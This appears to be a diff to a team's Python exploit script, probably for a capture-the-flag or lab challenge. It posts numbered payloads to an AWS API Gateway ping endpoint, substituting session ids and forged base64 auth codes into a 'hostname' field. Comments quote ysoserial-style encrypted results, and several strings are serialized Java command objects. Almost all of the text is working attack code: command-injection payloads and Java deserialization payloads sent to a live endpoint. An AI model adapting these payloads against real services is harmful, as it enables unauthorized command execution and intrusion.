@@ -139,12 +139,12 @@ def rockman():
     print(r.status_code)
     print(r.text)
 
-    print("========== payload 00 vs 07 ==========")
-    print(payload_00)
+    #print("========== payload 00 vs 07 === Testing =======")
+    #print(payload_00)
     #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_00, headers=headers)
-    print(r.status_code)
-    print(r.text)
+    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_00, headers=headers)
+    #print(r.status_code)
+    #print(r.text)
 
 
 
@@ -170,6 +170,9 @@ def rockman():
     print(r.status_code)
     print(r.text)
 
+    commandauth_content = r.text.split('<user>')[1].split('</user>')
+
+
     # get tmp/aaa.enc
     # yso_payload1_result: U2FsdGVkX1+SqVuAjTom+gRMrBy+M1xkX/BGMy+2wrMv8YA4cxp5fHoSuCKxT20B\nBqf3oRlRJbiOKPLTVgQhgwy3LqBZHm4hK1fxHeYnKErIIrQdL/2m1Se+MmmTK3y8\ntP6tWECvqghS53/iZxLOTVQRmbuxx0fTm/Lrp7X45xz9rmEuFLtcck+1+zU9AGoy\n1XLcarQplT5AL2pysXLkXmrwWa18JvnsKCLxVWDD71HgblxZ96gx+jd04sPuFMcM\n4f7fjZrBFyOa9HVpm0L3bFBSEIWtNQTnWEVH0xI4Q0sYjSHPJyFK2OqEyuBUoPEt\nw6Rvdc9Pw15ZktwDDZHH9cd3cu7OAx5Km2falexEJ+OfDtijONvNO4LVoUYwKg+r\n
     # yso_payload2_result: U2FsdGVkX19RmtY0OHYM8NLR8XQ3s7xqV/LUj6zfweUdq9Jp3KqPG5fng3P9+V/U\nFvTlrFGq9iQ+MUyBWq/mxN8lYqrXcjzcXjMDKlqxf9YrqQwLtVLtOhUPuBJNQXUF\ns5X1lp/ZghXczlrNI3QU8MYA4k5+zvj+i9+lT1THVrjsqWI1M6+w9jrFpQMFDasr\nJH8pr9Aj6DwDLqaTlAOTQF5cD/CbbLCBPgIkI+/NraVBqJHKKXjV6QPGbvyeFxkZ\nCJcb3RaIgX3F+WxxaTBIRWNzm/IR20izsJG+vXSNLyf+MSH0kEGN8sKZa2w7WiF8\n9jfGGPF83W8MfjibXwFh816J7ASTqZqUOJ83vn9xCrDY6lKE3G6jSQ/HpzTQ01nB\n
@@ -180,14 +183,14 @@ def rockman():
     # rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w==
     # rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w==
     
-    print("========== payload 11 ==========")
-    authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w=="
-    print(payload_11)
-    payload_11["hostname"] = payload_11["hostname"].replace("ZZZZZZZZZZ", sessionid01)
-    payload_11["hostname"] = payload_11["hostname"].replace("YYYYYYYYYY", authcode)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_11, headers=headers)
-    print(r.status_code)
-    print(r.text)
+    #print("========== payload 11 ==== Not correct format ======")
+    #authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w=="
+    #print(payload_11)
+    #payload_11["hostname"] = payload_11["hostname"].replace("ZZZZZZZZZZ", sessionid01)
+    #payload_11["hostname"] = payload_11["hostname"].replace("YYYYYYYYYY", authcode)
+    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_11, headers=headers)
+    #print(r.status_code)
+    #print(r.text)
 
     print("========== payload 12 ==========")
     authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
@@ -200,7 +203,7 @@ def rockman():
     print(r.text)
 
 
-    #print("========== payload 13 =======ERIC TEST ===")
+    #print("========== payload 13 ======= Erica TEST ===")
     #authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
     #print(payload_13)
     #payload_13["hostname"] = payload_13["hostname"].replace("ZZZZZZZZZZ", sessionid01)
@@ -211,7 +214,7 @@ def rockman():
     #print(r.text)
 
 
-    #print("========== payload 13.5 =======Yi shan said use authcode play again ===")
+    #print("========== payload 13.5 =======Yi SYuan said use authcode play again ===")
     #authcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
     #print(payload_135)
     #payload_135["hostname"] = payload_135["hostname"].replace("ZZZZZZZZZZ", sessionid01)
@@ -221,7 +224,7 @@ def rockman():
     #print(r.status_code)
     #print(r.text)
 
-    #print("========== payload 14 ==========")
+    #print("========== payload 14 ===== Test for wired authcode =====")
     #finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAHjrO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9QdAAAfnIAEnNlcmlhbC5Db21tYW5kVHlwZQAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQABFNUT1A="
     #print(payload_14)
     #payload_14["hostname"] = payload_14["hostname"].replace("ZZZZZZZZZZ", sessionid01)
